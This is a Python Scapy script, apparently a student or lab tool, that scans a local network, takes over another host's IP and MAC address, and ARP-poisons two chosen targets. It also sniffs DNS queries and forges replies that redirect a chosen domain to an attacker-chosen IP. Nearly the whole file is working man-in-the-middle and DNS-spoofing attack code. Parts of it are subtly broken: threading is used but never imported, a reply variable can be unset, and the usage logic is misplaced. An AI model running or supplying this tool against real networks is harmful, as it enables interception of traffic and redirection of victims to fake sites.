from scapy.all import *
import struct
import os
import time
import sys
import _thread
import netifaces as ni
import socket

current_mac = ""
current_ip = ""
original_ip = ""
hosts = []
clients = []

target_dns = {}

# First input will be the target domain name
# Second input will be the target spoof ip
def set_variables():
    target_dns[sys.argv[2]+"."] = sys.argv[3]
    target_dns["www."+sys.argv[2]+"."] = sys.argv[3]
    print("Spoofing site (www)" + sys.argv[2] + " to IP: " + sys.argv[3])


def process_packet(packet):
    # Only process DNS query packets. Ignore other packets.
    if packet.haslayer(DNSQR):
        reply_packet = modify_pocket(packet)
    # Send the DNS answer to the query source
    send(reply_packet, verbose=0)

# Modify packet for DNS Querries sniffed by Scapy
def modify_pocket(packet):
    # Obtain queried domain name
    qname = packet[DNSQR].qname
    decoded = qname.decode("utf-8")

    # If doesn't match, don't modify the packet
    if decoded not in target_dns:
		# Program in verbose mode, will not direct query to correct DNS server
        return packet

    # Else, modify target domain translation
    print("Redirecting to traffic to " + sys.argv[3])

    # Create Layer 3 reply packet
    reply_packet = IP(src=packet[IP].dst,dst=packet[IP].src)/UDP(dport=packet[UDP].sport) / \
        DNS(id=packet[DNS].id, qd=DNSQR(qname=qname))

    # Set DNS query to be of DNS answer type
    reply_packet[DNS].an = DNSRR(rrname=qname, rdata=target_dns[decoded])
    reply_packet[DNS].ancount = 1
    reply_packet[DNS].qr = 1
    reply_packet[DNS].aa = 1

    # Print output packet to console
    print(reply_packet.summary())
    return reply_packet


def DNS_Spoof_Start():
    # Start variable setting
    set_variables()
    # Start sniffing
    sniff(filter="port 53", prn=process_packet)

# Gets the current mac and IP address to restore later on
def get_current_details():
    ni.ifaddresses('eth0')
    current_mac = Ether().src
    current_ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']

# Restores the device's IP and MAC address to its original
def restore_ip_and_mac(netmask):
    #os.system("sudo ifconfig eth0 {} netmask {}".format("192.168.0.28", "255.255.255.0"))
    os.system("nmcli device modify eth0 ipv4.address 192.168.0.28")
    #os.system("ifconfig eth0 hw ether {}".format(current_mac))
    os.system("macchanger -p eth0")


# Performs MAC and IP Address Spoofing on the selected device
def change_ip_and_mac(target_details, netmask):
    selected_mac = target_details['mac']
    selected_ip = target_details['ip']
    os.system("nmcli device modify eth0 ipv4.address {}".format(selected_ip))
    os.system("macchanger -m {} eth0".format(selected_mac))

# Performs an ARP Scan in the Internal Network
def ARPScan(target_ip):
    print("Scanning Available Devices....")
    # Set ARP target
    arp = ARP(pdst=target_ip)

    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    # Send Host Discovery Packet at Layer 2 Level
    result = srp(packet, timeout=3, verbose=0)[0]
    # Sends ARP Discovery packet every host in the network
    for sent, received in result:
        clients.append({'ip': received.psrc, 'mac': received.hwsrc})
        hosts.append({'ip': received.psrc, 'mac': received.hwsrc})
    print("Available devices in network")
    print("IP" + " "*18 + "MAC")
    counter = 1
    for client in clients:
        print("{} {:16}    {}".format(counter, client['ip'], client['mac']))
        counter = counter + 1
    device_no = input("Select Device to Spoof: ")
    selected_details = clients[int(device_no)-1]
    hosts.pop(int(device_no)-1)
    return selected_details

# Selects the targets to perform ARP Poisoning on.
def Select_ARP_Targets():
    print("Please Select your 2 ARP Targets")
    targets = []
    # Select 2 targets
    for i in range(2):
        counter = 1
        for client in clients:
            print("{} {:16}    {}".format(
                counter, client['ip'], client['mac']))
            counter = counter + 1
        device_no = input("Select Target {}: ".format(i+1))
        target = clients[int(device_no)-1]
        targets.append(target)
    return targets

# Spoofs the selected targets


def spoof(targets, verbose=True):
    # target 1: gateway
    # target 2: webserver
    target_ip = targets[0]['ip']
    target_mac = targets[0]['mac']
    host_ip = targets[1]['ip']
    host_mac = targets[1]['mac']

    # Craft the ARP Response packet.
    # "is-at" operation makes all devices update their arp tables
    arp_response_packet = ARP(pdst=target_ip, hwdst=target_mac,
                              psrc=host_ip, op='is-at')
    # send the packet, this is set to verbose 0 to prevent any printing
    send(arp_response_packet, verbose=0)
    if verbose:
        # get the MAC address of the default interface we are using
        print("[+] Sent 'is-at' packet to {} : {}".format(target_ip, host_ip))

# Restores the target's arp tables.


def restore(targets):
    # target 1: gateway
    # target 2: webserver
    target_ip = targets[0]['ip']
    target_mac = targets[0]['mac']
    host_ip = targets[1]['ip']
    host_mac = targets[1]['mac']

    # Crafting of the ARP Response packet to restore the ARP Tables for the targets
    arp_response_packet = ARP(pdst=target_ip, hwdst=target_mac,
                              psrc=host_ip, hwsrc=host_mac, op='is-at')
    # Sending the restoration packet to reverse the arp poisoning
    # Setting count to 10 to ensure the arp table is restored
    send(arp_response_packet, count=10, verbose=True)

def arp_poison(targets):
    counter = 0
    while True:
        spoof(targets, True)
        time.sleep(5)

def run(targets):
    counter = 0
    x = threading.Thread(target=DNS_Spoof_Start, daemon=True)
    x.daemon = True
    x.start()
    arp_poison(targets)    	

if __name__ == "__main__":
    if len(sys.argv) >= 4:
        target_ip = sys.argv[1]
        print("Victim IP: {}".format(target_ip))

    # Calculate Netmask
    net_bits = target_ip.split("/")
    host_bits = 32 - int(net_bits[1])
    netmask = socket.inet_ntoa(struct.pack('!I', (1 << 32) - (1 << host_bits)))
    # Get Current IP and Mac Address
    get_current_details()
    # Performs an ARP Scan to find all hosts in the network
    target_details = ARPScan(target_ip)
    targets = Select_ARP_Targets()
    try:
        # Changes Layer 2 IP and Mac address
        change_ip_and_mac(target_details, netmask)
        # Performs the ARP Poisoining within intervals of 5 seconds so as to not flood the network
        run(targets)
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C ! restoring the network, please wait...")
        # Restores the Rogue DNS Server's HWID and IP 
        # After that, it restores the server's tables
        restore_ip_and_mac(netmask)
        restore(targets)
        print("Finished")
    else:
        print("Usage\t: help.py <victim_ip> <domain_name> <target_ip>")
        print("argv[1]\t: Sets the Victim IP (i.e. 192.168.0.0/24)")
        print("argv[2]\t: Sets the Domain Name (i.e. domain.com)")
        print("argv[3]\t: Sets the Target IP (i.e. 150.28.1.28)")
